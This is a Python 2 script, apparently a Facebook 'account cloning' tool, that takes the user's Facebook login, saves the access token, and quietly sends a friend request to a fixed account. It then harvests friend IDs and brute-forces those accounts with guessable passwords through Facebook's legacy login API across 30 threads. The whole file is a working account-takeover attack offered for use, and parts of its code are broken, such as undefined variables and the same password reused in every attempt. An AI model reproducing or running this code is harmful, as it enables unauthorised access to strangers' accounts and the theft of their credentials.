#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To MURSHAD FAMILY
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:Murshad Family
##### LOGO #####
logo = """
\033[1;97m ❥▦▦▦▦M⃟▦▦▦▦▦▦❥▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦N⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97m ❥▦▦▦▦U⃟▦▦▦▦▦❥▦▦▦❥▦▦▦❥▦▦▦▦❥▦▦▦▦O⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97m ❥▦▦▦▦R⃟▦▦▦▦❥▦▦▦▦▦❥▦❥▦▦▦▦▦▦❥▦▦▦R⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97m ❥▦▦▦▦S⃟▦▦▦▦❥▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦U⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97m ❥▦▦▦▦H⃟▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦L⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦A⃟▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦E⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦D⃟▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦S⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦F⃟▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦❥▦▦▦▦▦▦J⃟U⃟S⃟T⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦A⃟▦▦▦▦▦▦▦▦❥▦▦▦▦▦❥▦▦▦▦▦▦▦D⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦M⃟▦▦▦▦▦▦▦▦▦❥▦▦▦❥▦▦▦▦▦▦▦▦E⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦L⃟▦▦▦▦▦▦▦▦▦▦❥▦❥▦▦▦▦▦▦▦▦▦A⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥▦▦▦▦Y⃟▦▦▦▦▦▦▦▦▦▦❥▦▦▦▦▦▦▦▦▦▦▦D⃟▦▦▦❥❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥• \033[1;97m●M⃟U⃟R⃟S⃟H⃟A⃟D⃟ F⃟A⃟M⃟I⃟L⃟Y⃟●\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil= []
Secsesfull= []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
 \033[1;97m ┏━┓┏━┓┏┓╋┏┓┏━━━┓┏━━━┓┏┓╋┏┓┏━━━┓┏━━━┓
 \033[1;97m ┃┃┗┛┃┃┃┃╋┃┃┃┏━┓┃┃┏━┓┃┃┃╋┃┃┃┏━┓┃┗┓┏┓┃
 \033[1;97m ┃┏┓┏┓┃┃┃╋┃┃┃┗━┛┃┃┗━━┓┃┗━┛┃┃┃╋┃┃╋┃┃┃┃
 \033[1;93m ┃┃┃┃┃┃┃┃╋┃┃┃┏┓┏┛┗━━┓┃┃┏━┓┃┃┗━┛┃╋┃┃┃┃
 \033[1;93m ┃┃┃┃┃┃┃┗━┛┃┃┃┃┗┓┃┗━┛┃┃┃╋┃┃┃┏━┓┃┏┛┗┛┃
 \033[1;93m ┗┛┗┛┗┛┗━━━┛┗┛┗━┛┗━━━┛┗┛╋┗┛┗┛╋┗┛┗━━━┛
 \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥••
 \033[1;93m ❥•❥•❥•❥•❥•❥•❥•❥•Welcm To Murshad Family❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  R⃟U⃟L⃟E⃟S⃟\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•
\033[1;97mAuthor\033[1;97m    :❥•❥•❥•❥• \033[1;97m MURSHAD FAMILY
\033[1;97mBMURSHAD FAMILY\033[1;97m:❥•❥•❥•❥• \033[1;97▒▓██████████████]99.9
\033[1;93mFacebook\033[1;93m  :❥•❥•❥•❥• \033[1;93mAFTAB.HUSSAIN
\033[1;93mWhatsapp\033[1;93m  :❥•❥•❥•❥• \033[1;93m+923131921102
\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mMURSHAD.FAMILY\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"""
jalan('\033[1;97m❥•❥•❥•❥•❥•❥•❥•❥•M⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟❥•❥•❥•❥•❥•❥•❥•❥•:')

CorrectUsername = "MURSHAD"
CorrectPassword = "GANG"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m🔐 \x1b[1;93mTool Username \x1b[1;97m»» \x1b[1;93m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🔐 \x1b[1;93mTool Password \x1b[1;97m»» \x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:MURSHAD-FAMILY
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.facebook.com/pankaj.panku.35') 
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/pankaj.panku.35')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;91mWarning: \033[1;93mTermux Old Version Install 0.63 to 0.83' )
		jalan(' \033[1;91m   Note: \033[1;93mUse a New Account To Login' )
		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
		print('	   \033[1;97m■\x1b[1;93m❥•❥•❥•❥••LOGIN WITH FACEBOOK❥•❥•❥•❥••\x1b[1;97m■' )
		print('	' )
		id = raw_input('\033[1;97m[+] \x1b[1;93mID/Email\x1b[1;97m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;93mPassword\x1b[1;97m: \x1b[1;93m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful...'
				os.system('xdg-open https://www.facebook.com/pankaj.panku.35')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91mThere is no internet connection"
				keluar()
		if 'Secsesfull' in url:
			print("\n\x1b[1;91mYour Account is on Secsesfull")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on login"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;97mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:M⃟U⃟R⃟S⃟H⃟A⃟D⃟  G⃟A⃟N⃟G⃟
	print logo
	print "  \033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mLogged in User Info\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
	print "	   \033[1;97m Name\033[1;93m:\033[1;93m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;93m  :\033[1;93m"+id+"\x1b[1;97m              "
	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟ F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;93mStart Cloning..."
	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m--\033[1;97m> \033[1;93m1.\x1b[1;93mClone From Friend List..."
	print "\033[1;97m--\033[1;97m> \033[1;93m2.\x1b[1;93mClone From Public ID..."
	print "\033[1;97m--\033[1;97m> \033[1;97m0.\033[1;97mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;93mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
		jalan('\033[1;97mGetting IDs \033[1;93m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;93m[♡] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
		print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟D⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
		except KeyError:
			print"\x1b[1;93mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;91mM⃟U⃟R⃟S⃟H⃟A⃟D⃟\033[1;97m]")
			super()
		print"\033[1;93mGetting IDs\033[1;93m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;93mTotal IDs\033[1;93m: \033[1;97m"+str(len(id))
	jalan('\033[1;93mPlease Wait\033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;93m■To Stop Process Press CTRL+Z■\033[1;97m----»"
	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;93mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
	jalan(' \033[1;97m ❥•❥•❥•❥•❥•❥•❥•❥•Cloning Start plzzz Wait❥•❥•❥•❥•❥•❥•❥•❥• ')
	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
	
			
	def main(arg):
		oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:MURSHAD GANG
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			
			
			pass2 = ('Pakistan')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass2)
				
				
			pass3 = ('first_name') +('123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass3)
				
				
			pass4 = ('first_name') + ('1234')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass4)
				
				
			pass5 = ('first_name') + ('12345')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass5)
				
				
			pass6 = ('first_name') + ('786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass6)
				
				
			pass7 = ('last_name') + ('123')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass7)
				
				
			pass8 = ('last_name') + ('1234')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass8)
				
				
			pass9 = ('last_name') + ('12345')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass9)
				
				
			pass10 = ('last_name') + ('786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
				
		
			pass11 = ('Mahi12345')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				oks.append(user+pass1)
				
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•\033[1;97mM⃟U⃟R⃟S⃟H⃟A⃟D⃟  F⃟A⃟M⃟I⃟L⃟Y⃟\033[1;93m❥•❥•❥•❥•❥•❥•❥•❥•"
	print "  \033[1;93m«❥•❥•❥•❥•Developed By AFTAB❥•❥•❥•❥•»" #Dev:MURSHAD GANG
	print '\033[1;93mProcess Has Been Completed\033[1;97m....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print """
             
             ...........███ ]▄▄▄▄▄▃❥•❥•❥•❥•
             ..▂▄▅█████▅▄▃▂
             [███████████████]
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.
: \033[1;97m ❥•❥•❥•❥•MURSHAD  FAMILY RULES❥•❥•❥•❥• \033[1;93m :
••••••••••••••❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•❥•••••••••••.' 
                whatsapp Num
               +923131921102"""
	
	raw_input("\n\033[1;93m[\033[1;91mM⃟U⃟R⃟S⃟H⃟A⃟D⃟\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
